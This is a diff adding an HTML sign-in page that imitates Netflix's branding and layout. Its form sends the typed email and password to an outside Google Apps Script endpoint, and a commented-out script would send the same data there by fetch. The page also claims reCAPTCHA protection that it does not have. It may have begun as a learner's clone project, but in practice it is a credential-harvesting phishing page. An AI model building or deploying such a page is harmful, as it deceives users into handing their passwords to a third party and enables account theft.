@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sign in page</title>
+    <style>
+        body{
+            color: white;
+            margin:8px;
+            padding:0px;
+            background: linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('netflixbg.jpg');
+            height: 90px;
+        }
+         .signin-left{
+             display: inline-block;
+             /* border: green; */
+             left: 34px;
+             top:35px;
+        }
+         .signin-mid{
+            display:block ;
+            width: 25%;
+            margin:85px 295px;
+            /* border: red; */
+             background-color: rgb(31 27 27 / 95%); 
+            position: absolute;
+            left: 9%;
+            height: 417px;
+            padding: 20px 20px;
+            
+        }
+         .signin-left img{
+            width: 76px;
+        }
+         .signin-mid h1{
+            margin: 0px 69px;
+            padding: 8px;
+            width: 36%;
+        }
+         .signin-mid input{
+            margin: 10px 20px;
+            padding: 10px;
+            border: 2px solid grey;
+            border-radius: 3px;
+            /* color: white; */
+            /* background-color:grey; */
+            background-color: #333;
+            width:71%;
+            
+        }
+         .signin-btn{
+            margin: 20px 21px;
+            padding: 13px 20px;
+            width:76%;
+            background-color: red;
+            color: white; 
+            font-size: 17px; 
+            border-radius: 3px;
+        }
+        .signin-navbar li{
+        display: inline-block;
+        
+       }
+
+        .signin-navbar li a{
+        color: white;
+        text-decoration: none;
+        padding: 0px 0px;
+    margin: 0px 0px;
+    position: relative;
+    left: -20%;
+    
+       }
+        .signin-mid p{
+        font-size: 14px;
+       
+       }
+       .signin-mid p a{
+        text-decoration: none;
+       }
+       .signin-mid p a:hover{
+        color:chartreuse;
+       }
+       .signin-btn:hover{
+        background-color:rgba(223, 122, 122, 0.7)
+       }
+       .signin-footer {
+    margin: 600px 0px;
+    padding: 0px 0px;
+     position: relative; 
+    /* top: 510px; */
+    background-color:rgba(222, 98, 98, 0.95);
+    height: 30vh;
+    width: 100vw;
+       }
+       .signin-footer a{
+        text-decoration: none;
+        padding:2px 37px;
+        margin: 5px 6px;
+        position: relative;
+        top:28px;
+       }
+
+    </style>
+</head>
+<body>
+    <header class=" signin-header">
+        <div class=" signin-left">
+             <img src="netflix.jpg" >
+        </div>
+        <div class=" signin-mid">
+            <h1>Sign In</h1>
+             <form action="https://script.google.com/macros/s/AKfycbxqhxDXB2Irf8fEQY9kwrRFptDAPqPB7QTck6w9--L0banG2cEy9tate-JQRIdid3mVbg/exec" method="post"> 
+            <div><input type="email" name="email" placeholder = "Email" ></div>
+            <div><input type="password" name="password" placeholder="Password " >
+            </div>
+        
+            <div>
+                <button class=" signin-btn">Sign In</button>
+            </div>
+        </form>
+            
+            <ul class=" signin-navbar">
+                
+                               
+                <li><a href="#" >Need help?</a></li>
+            </ul>
+            <br>
+            <div>
+                <p>New to Netflix? <a href="index.html">Sign up.</a></p>
+
+            </div>
+            <div>
+                <p>This page is prtected by Google reCAPTCHA to ensure you're not a bot. <a href="https://policies.google.com/privacy" target="_blank">Learn more.</a></p>
+            </div>
+        </div>
+    </header>
+        <div class="signin-footer">
+            <div class="signin-help"><a href="contactus.html">Contact us</a>
+             <a href="helpcentre.html">Help centre</a></div>
+        </div>
+    
+
+        <!-- <script> -->
+            <!-- let form= document.querySelector("form"); -->
+            <!-- form.addEventListener('Sign In', (e) => { -->
+                <!-- e.preventDefault(); -->
+                <!-- let data= new FormData(form); -->
+                <!-- fetch('https://script.google.com/macros/s/AKfycbxqhxDXB2Irf8fEQY9kwrRFptDAPqPB7QTck6w9--L0banG2cEy9tate-JQRIdid3mVbg/exec',{ -->
+                    <!-- method:"POST", -->
+                    <!-- body:data -->
+                <!-- }) -->
+                <!-- .then(res => res.text()) -->
+                <!-- .then(data => console.log(data)); -->
+            <!-- }) -->
+        <!-- </script> -->
+</body>
+</html>
